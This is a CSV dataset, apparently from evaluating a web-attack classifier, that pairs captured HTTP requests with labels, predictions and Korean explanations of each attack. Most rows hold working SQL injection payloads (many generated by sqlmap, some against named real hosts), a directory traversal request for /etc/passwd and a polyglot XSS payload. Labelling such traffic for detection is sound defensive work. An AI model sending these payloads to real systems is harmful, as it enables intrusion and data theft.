Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
26471,"GET /ktv_contents.jsp?cid=492126+and+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330372e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330382e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330392e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031302e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031362e39+as+char) HTTP/1.1\r\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip\r\nCookie: WMONID=j9ttiW6ufc2; JSESSIONID=aaaeSuuHxxhTsclHc60IxX7pOhkpL4PhR4VrxZgT2_-iQFc3WicUu52vevR2\r\nHost: www.ktv.go.kr",1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 유형 : SQL Injection"
48427,"GET /wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1Host: newsletter.karts.ac.krUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36Connection: closeAccept: */*Accept-Language: enAccept-Encoding: gzip",1,PT,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
공격 유형 : Directory Traversal"
124242,"GET /stats/search_auto_complete?keyword=%23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://www.mall.shop/goods/catalog?page=1&searchMode=catalog&category=c00110003&per=40&sorting=ranking&filter_display=lattice
Cookie: mobileapp=N; shopReferer=; marketplace=direct; mobileapp=N
Content-Length: 0",1,XSS,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e
공격 유형 : Cross-Site Scripting (XSS)"
124046,"GET /stats/search_auto_complete?keyword=%23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://www.mall.shop/
Cookie: mobileapp=N; mobileapp=N; shopReferer=; marketplace=direct
Content-Length: 0",1,XSS,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : #jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e
공격 유형 : Cross-Site Scripting (XSS)"
124477,"GET /stats/search_auto_complete?keyword=%23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://www.mall.shop/promotion/event?event_name=ZAP&sc_filter=sales&sc_status=ing
Cookie: mobileapp=N; mobileapp=N; shopReferer=; marketplace=direct; today_view=a%3A4%3A%7Bi%3A0%3Bi%3A38%3Bi%3A1%3Bi%3A39%3Bi%3A2%3Bi%3A69%3Bi%3A3%3Bi%3A80%3B%7D
Content-Length: 0",1,XSS,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e
공격 유형 : Cross-Site Scripting (XSS)"
8217,"GET /ktv_contents.jsp?cid=999999.9+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330372e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330382e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330392e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031302e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031372e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031382e39+as+char) HTTP/1.1\r\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip\r\nCookie: WMONID=j9ttiW6ufc2; JSESSIONID=aa",1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : /ktv_contents.jsp?cid=999999.9+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f%2...
공격 유형 : SQL Injection"
124378,"GET /stats/search_auto_complete?keyword=%23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://www.mall.shop/main
Cookie: mobileapp=N; mobileapp=N; shopReferer=; marketplace=direct; today_view=a%3A4%3A%7Bi%3A0%3Bi%3A38%3Bi%3A1%3Bi%3A39%3Bi%3A2%3Bi%3A69%3Bi%3A3%3Bi%3A80%3B%7D
Content-Length: 0",1,XSS,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e
공격 유형 : Cross-Site Scripting (XSS)"
29848,"GET /board/qna_view.asp?pkey=416&page=4%27+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+null+%2f**%2f%2f**%2ffRoM+dual+and+%271%27%3d%271 HTTP/1.1
Accept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:40.0) Gecko/20100101 Firefox/40.0
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip
Host: review.riak.or.kr",1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %27+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+null+%2f**%2f%2f**%2ffRoM+dual+and+%271%27%3d%271
공격 유형 : SQL Injection"
124495,"GET /stats/search_auto_complete?keyword=%23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://www.mall.shop/service/privacy
Cookie: mobileapp=N; shopReferer=; marketplace=direct; mobileapp=N; today_view=a%3A1%3A%7Bi%3A0%3Bi%3A38%3B%7D
Content-Length: 0",1,XSS,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 유형 : Cross-Site Scripting (XSS)"
29423,"GET /board/photo.asp?page=999999.9+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330352e39+as+char)-- HTTP/1.1\r\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip\r\nHost: youth.koreanpc.kr",1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : /uNiOn/AlL/sElEcT/cAsT(0x393631353738343330312e39 as char),/cAsT(0x393631353738343330322e39 as char),/cAsT(0x393631353738343330332e39 as char),/cAsT(0x393631353738343330342e39 as char),/cAsT(0x393631353738343330352e39 as char)--
공격 유형 : SQL Injection"
6935,"http://-ip-:-port-/dvwa/instructions.php')))/**/AND/**/2960=BENCHMARK(5000000,MD5(0x77764d4f))/**/AND/**/((('bLBu'='bLBu /dvwa/instructions.php?doc=1 sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : 2960=BENCHMARK(5000000,MD5(0x77764d4f))
공격 유형 : SQL Injection"
3271,"http://-ip-:-port-/dvwa/instructions.php /dvwa/instructions.php?doc=1 -9384'))/**/OR/**/3160=3160--/**/NxYP PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : -9384'))/**/OR/**/3160=3160--/**/NxYP
공격 유형 : SQL Injection"
22599,"http://-ip-:-port-/dvwa/instructions.php /dvwa/instructions.php?doc=1 -9866)))/**/OR/**/1241=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(122)||CHR(106)||CHR(106)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(1241=1241)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(107)||CHR(120)||CHR(98)||CHR(113))/**/AND/**/(((6056=6056 PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : -9866)))/**/OR/**/1241=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(122)||CHR(106)||CHR(106)||CHR(113)||(SELECT/**/(CASE/**/WHEN/**/(1241=1241)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(113)||CHR(107)||CHR(120)||CHR(98)||CHR(113))/**/AND/**/(((6056=6056
공격 유형 : SQL Injection"
28853,"_scode=C1203020000');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(116)||CHR(109)||CHR(82),5) FROM DUAL--",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : _scode=C1203020000');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(116)||CHR(109)||CHR(82),5) FROM DUAL--
공격 유형 : SQL Injection"
30731,"/dvwa/instructions.php?doc=1%20ORDER%20BY%204028--%20NvkO sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=bqfb6kiqghp21994lpt0kfl-port-b;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : ORDER BY 4028-- NvkO
공격 유형 : SQL Injection"
5173,"-8210')))/**/OR/**/5504=5504--/**/Iukl /dvwa/instructions.php?doc=1 sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : -8210')))/**/OR/**/5504=5504--/**/Iukl /dvwa/instructions.php?doc=1
공격 유형 : SQL Injection"
70454,"GET /service?id=en_index AND 6155=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(122)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (6155=6155) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) HTTP/1.1Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateHost: www.busanport.comAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7Connection: closePragma: no-cacheCache-Control: no-cache,no-store",1,,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(122)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (6155=6155) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL
공격 유형 : SQL Injection"
24497,"http://-ip-:-port-/dvwa/instructions.php /dvwa/instructions.php?doc=1 (CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(122)+CHAR(106)+CHAR(106)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(5150=5150)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(98)+CHAR(113)))) PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : (CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(122)+CHAR(106)+CHAR(106)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(5150=5150)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(98)+CHAR(113)))
공격 유형 : SQL Injection"
20524,"-7305')/**/OR/**/9632=9632/**/AND/**/('yVPo'='yVPo /dvwa/instructions.php?doc=1 sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : -7305')/**/OR/**/9632=9632/**/AND/**/('yVPo'='yVPo
공격 유형 : SQL Injection"
31694,"http://-ip-:-port-/dvwa/instructions.php%'/**/AND/**/6276=3059/**/AND/**/'IpEw%'='IpEw /dvwa/instructions.php?doc=1 sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : http://-ip-:-port-/dvwa/instructions.php%'/**/AND/**/6276=3059/**/AND/**/'IpEw%'='IpEw /dvwa/instructions.php?doc=1
공격 유형 : SQL Injection"
9570,"http://-ip-:-port-/dvwa/instructions.php)/**/AND/**/4790=CAST((CHR(113)||CHR(122)||CHR(106)||CHR(106)||CHR(113))||(SELECT/**/(CASE/**/WHEN/**/(4790=4790)/**/THEN/**/1/**/ELSE/**/0/**/END))::text||(CHR(113)||CHR(107)||CHR(120)||CHR(98)||CHR(113))/**/AS/**/NUMERIC)--/**/BFBz /dvwa/instructions.php?doc=1 sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : )/**/AND/**/4790=CAST((CHR(113)||CHR(122)||CHR(106)||CHR(106)||CHR(113))||(SELECT/**/(CASE/**/WHEN/**/(4790=4790)/**/THEN/**/1/**/ELSE/**/0/**/END))::text||(CHR(113)||CHR(107)||CHR(120)||CHR(98)||CHR(113))/**/AS/**/NUMERIC)--
공격 유형 : SQL Injection"
23884,"http://-ip-:-port-/dvwa/instructions.php /dvwa/instructions.php?doc=1 -1471%'/**/OR/**/(SELECT/**/(CASE/**/WHEN/**/(2911=4088)/**/THEN/**/NULL/**/ELSE/**/CTXSYS.DRITHSX.SN(1,2911)/**/END)/**/FROM/**/DUAL)/**/IS/**/NULL/**/AND/**/'QciX%'='QciX PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : -1471%'/**/OR/**/(SELECT/**/(CASE/**/WHEN/**/(2911=4088)/**/THEN/**/NULL/**/ELSE/**/CTXSYS.DRITHSX.SN(1,2911)/**/END)/**/FROM/**/DUAL)/**/IS/**/NULL/**/AND/**/'QciX%'='QciX
공격 유형 : SQL Injection"
23278,"http://-ip-:-port-/dvwa/instructions.php')))/**/OR/**/UPDATEXML(6271,CONCAT(0x2e,0x717a6a6a71,(SELECT/**/(ELT(6271=6271,1))),0x716b786271),9353)/**/AND/**/((('jbQv'='jbQv /dvwa/instructions.php?doc=1 sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UPDATEXML(6271,CONCAT(0x2e,0x717a6a6a71,(SELECT/**/(ELT(6271=6271,1))),0x716b786271),9353)
공격 유형 : SQL Injection"
10990,"http://-ip-:-port-/dvwa/instructions.php))/**/AND/**/2960=BENCHMARK(5000000,MD5(0x77764d4f))/**/AND/**/((6909=6909 /dvwa/instructions.php?doc=1 sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : ))/**/AND/**/2960=BENCHMARK(5000000,MD5(0x77764d4f))/**/AND/**/((6909=6909
공격 유형 : SQL Injection"
9285,"http://-ip-:-port-/dvwa/instructions.php /dvwa/instructions.php?doc=1 -1938'/**/OR/**/9092=CONCAT(CHAR(113)+CHAR(122)+CHAR(106)+CHAR(106)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(9092=9092)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(107)+CHAR(120)+CHAR(98)+CHAR(113))/**/AND/**/'vUCf'/**/LIKE/**/'vUCf PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : -1938'/**/OR/**/9092=CONCAT(CHAR(113)+CHAR(122)+CHAR(106)+CHAR(106)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(9092=9092)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(107)+CHAR(120)+CHAR(98)+CHAR(113))/**/AND/**/'vUCf'/**/LIKE/**/'vUCf
공격 유형 : SQL Injection"
6779,"http://-ip-:-port-/dvwa/instructions.php /dvwa/instructions.php?doc=1 -4379))/**/OR/**/(SELECT/**/(CASE/**/WHEN/**/(5147=2090)/**/THEN/**/NULL/**/ELSE/**/CTXSYS.DRITHSX.SN(1,5147)/**/END)/**/FROM/**/DUAL)/**/IS/**/NULL/**/AND/**/((2967=2967 PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : -4379))/**/OR/**/(SELECT/**/(CASE/**/WHEN/**/(5147=2090)/**/THEN/**/NULL/**/ELSE/**/CTXSYS.DRITHSX.SN(1,5147)/**/END)/**/FROM/**/DUAL)/**/IS/**/NULL/**/AND/**/((2967=2967
공격 유형 : SQL Injection"
29928,"http://-ip-:-port-/dvwa/instructions.php')/**/AND/**/6743=(SELECT/**/(CASE/**/WHEN/**/(6743=8-port-2)/**/THEN/**/6743/**/ELSE/**/(SELECT/**/8-port-2/**/UNION/**/SELECT/**/4936)/**/END))--/**/XMdK /dvwa/instructions.php?doc=PDF%27%3B sqlmap/1.5.1.40#dev (http://sqlmap.org) security=impossible;,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : http://-ip-:-port-/dvwa/instructions.php')/**/AND/**/6743=(SELECT/**/(CASE/**/WHEN/**/(6743=8-port-2)/**/THEN/**/6743/**/ELSE/**/(SELECT/**/8-port-2/**/UNION/**/SELECT/**/4936)/**/END))--/**/XMdK
공격 유형 : SQL Injection"
7310,"http://-ip-:-port-/dvwa/instructions.php')))/**/OR/**/ELT(7775=7775,SLEEP(5))/**/AND/**/((('KjpU'='KjpU /dvwa/instructions.php?doc=1 sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,SI,,32,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : ELT(7775=7775,SLEEP(5))
공격 유형 : SQL Injection"
